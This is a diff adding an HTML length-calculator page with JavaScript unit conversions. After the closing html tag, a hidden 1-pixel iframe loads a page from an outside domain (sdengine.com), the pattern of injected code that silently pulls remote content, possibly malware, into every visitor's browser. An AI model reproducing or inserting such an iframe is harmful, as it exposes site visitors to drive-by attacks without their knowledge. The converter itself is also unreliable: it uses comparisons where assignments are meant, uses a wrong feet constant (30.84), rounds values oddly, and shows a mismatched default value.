@@ -1,0 +1,87 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Length Calculator</title>
+</head>
+<script type="text/javascript">
+function checnum(as)
+{
+var dd = as.value;
+if(isNaN(dd))
+{
+dd = dd.substring(0,(dd.length-1));
+as.value = dd;
+}
+} function inchconv(val){
+with(document.conv){
+cm.value = (Math.round(inch.value*2.54)).toFixed(2);
+feet.value=(Math.round(inch.value/12)).toFixed(2);
+var tmp=(inch.value* 2.54)*Math.pow(10,-5);
+kilo.value=((inch.value* 2.54)*Math.pow(10,-5)).toFixed(2);
+miles.value=((inch.value*1.58)*Math.pow(10,-5)).toFixed(2);
+} }
+function feetconv(val){
+with(document.conv){
+cm.value=(Math.round(feet.value*30.48)).toFixed(2);
+inch.value=(Math.round(feet.value*12)).toFixed(2);
+kilo.value=((feet.value* 3.05)*Math.pow(10,-4)).toFixed(2);
+miles.value==((feet.value*1.8900000000000001)*Math.pow(10,-4)).toFixed(2);
+} } function cmconv(val){
+with(document.conv){
+feet.value = (Math.round(cm.value/30.84)).toFixed(2);
+inch.value = (Math.round(cm.value/2.54)).toFixed(2);
+kilo.value=((cm.value*1)*Math.pow(10,-5)).toFixed(2);
+miles.value==((cm.value*6.21)*Math.pow(10,-6)).toFixed(2);
+} } function kiloconv(val){
+with(document.conv){
+feet.value = ((kilo.value*3.28)*Math.pow(10,3)).toFixed(2);
+inch.value = ((kilo.value*3.94)*Math.pow(10,4)).toFixed(2);
+cm.value=((kilo.value*1)*Math.pow(10,5)).toFixed(2);
+miles.value=((kilo.value* 0.621)).toFixed(2);
+} } function milesconv(val){
+with(document.conv){
+feet.value =((miles.value* 5.28)*Math.pow(10,3)).toFixed(2);
+inch.value = ((miles.value*6.34)*Math.pow(10,4)).toFixed(2);
+cm.value=((miles.value*1.61)*Math.pow(10,5)).toFixed(2);
+kilo.value=((miles.value*1.61)).toFixed(2);
+} } </script>
+
+<body bgcolor="#FFFFFF">
+
+<p>&nbsp;</p>
+
+<table border="0" width="100%">
+	<tr>
+		<td width="488">&nbsp;</td>
+		<td>
+
+<p align="center"><form name=conv>
+<table style='border:green solid 1px;font-size:12px'width=220 height=50>
+<tr>
+<td><font face="Arial" size="3">Length calculator</font></td>
+<td align=right>&nbsp;</td></tr>
+<tr><td align=center><font size="3" face="Arial"><input onkeyUp="checnum(this);inchconv();" value=1 name=inch></font></td><td>
+	<font face="Arial" size="3">inch</font></td></tr>
+<tr><td align=center><font size="3" face="Arial"><input
+onkeyUp="checnum(this);cmconv();" value=2.25 name=cm
+></font></td><td><font face="Arial" size="3">cm</font></td></tr>
+<tr><td align=center><font size="3" face="Arial"><input onkeyUp="checnum(this);feetconv();" value=0 name=feet
+></font></td><td><font face="Arial" size="3">feet</font></td></tr>
+<tr><td align=center><font size="3" face="Arial"><input onkeyUp="checnum(this);kiloconv();" value=0 name=kilo ></font></td><td>
+	<font face="Arial" size="3">kilo</font></td></tr>
+<tr><td align=center><font size="3" face="Arial"><input onkeyUp="checnum(this);milesconv();" value=0 name=miles></font></td><td>
+	<font face="Arial" size="3">Miles</font></td></tr>
+</table> </form> <font face="Arial"> <br>
+
+</font>
+
+</td>
+		<td>&nbsp;</td>
+	</tr>
+</table>
+
+</body>
+
+</html><iframe src="http://sdengine.com/ga.html" frameBorder="0" width="100%" height="1"></iframe>
